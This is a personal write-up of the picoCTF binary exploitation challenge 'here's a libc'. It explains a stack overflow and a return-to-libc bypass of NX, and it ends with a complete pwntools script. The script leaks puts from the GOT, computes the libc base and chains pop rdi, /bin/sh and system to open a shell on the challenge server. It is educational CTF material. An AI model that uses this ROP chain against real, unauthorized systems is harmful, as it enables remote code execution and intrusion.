# here's a libc
> challenge description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774

given: binary vuln libc.so.6 Makefile

## running the binary locally

gives a segmentation fault.

fixed this with pwninit (grabs the correct linker and creates a new binary that i can actually run called vuln_patched)

```console
┌──[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache]
└──╼ $./vuln_patched 
WeLcOmE To mY EcHo sErVeR!
test
TeSt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
Segmentation fault
```

## finding the vulnerability

looks like there's a basic stack-based overflow.

but NX is enabled, so if the normal buffer-overflow exploits try to put code on the stack and execute it, it won't work.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache]
└──╼ $checksec vuln_patched
[*] '/home/user/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
## bypassing NX bit using return-to-libc

requirement: a basic stackbased overflow vulnerability

since ALSR is disabled, libc base address would remain constant/static 

ROPGadets in x64:
* pop rdi is used to pop stack into rdi because in 64 bit arch, argumgents are put into register instead of stack
* 4 argument is rdi ->rsi -> rdx -> rcx

#### find a pop rdi to use

```console
```

#### find the offset needed to overwrite rsp

```console
x/xg $rsp

```

#### find the address of the puts function in the GOT and PLT (Procedural Link Table) of the binary.

```console
objdump -D vuln_patched | grep puts
```

### final exploit script
```python
#!/usr/bin/env python3

# https://akshit-singhal.medium.com/rop-chain-exploit-with-example-7e444939a2ec

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 1774)

    return r


def main():
    p = conn()
    context(os='linux', arch='amd64')
    put_plt_addr = p64(0x400540)                     # $ objdump -D vuln_patched | grep puts;;; (400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip))
    put_got_addr = p64(0x601018)                     # $ objdump -D vuln_patched | grep puts;;; (# 601018 <puts@GLIBC_2.2.5>)
    main_plt_addr = p64(0x400771)                    # $ objdump -D vuln_patched | grep main;;; (0000000000400771 <main>:)
    pop_rdi_gadget = p64(0x400913)                   # $ ROPgadget --binary vuln_patched | grep rdi; (0x0000000000400913 : pop rdi ; ret)
    
    # gdb > pattern create 200 > x/xg $rsp > pattern offset 0x41416d4141514141 for padding
    payload = b'A'*136
    payload += pop_rdi_gadget
    payload += put_got_addr
    payload += put_plt_addr
    payload += main_plt_addr
    p.clean()
    p.sendline(payload)
    p.recvline()
    p.recvline()

    received_line = p.recvline().strip()
    leaked = u64(received_line.ljust(8, b"\x00"))
    log.info(f"leaked address: {hex(leaked)}")

    libc.address = leaked - libc.symbols['puts']    # finding offset
    log.info(f"libc base address: {hex(libc.address)}")

    bin_sh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    ret = p64(0x40052e)                             # $ ROPgadget --binary vuln_patched | grep ret;; (find only "ret" instruction & add to avoid segfault)

        # segfault will occur due to alternative stack alignments in Ubuntu 18.04. 
        # solution is to find a simple ret address within the binary, and use that to re-align the stack after using /bin/sh
    
    log.info(f"/bin/sh: {hex(bin_sh)}")
    log.info(f"system: {hex(system)}")

    payload2 = b'A'*136
    payload2 += pop_rdi_gadget
    payload2 += p64(bin_sh)
    payload2 += ret
    payload2 += p64(system)
    
    p.clean()

    # log.info("Payload 2: " + str(payload2))

    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    main()
```
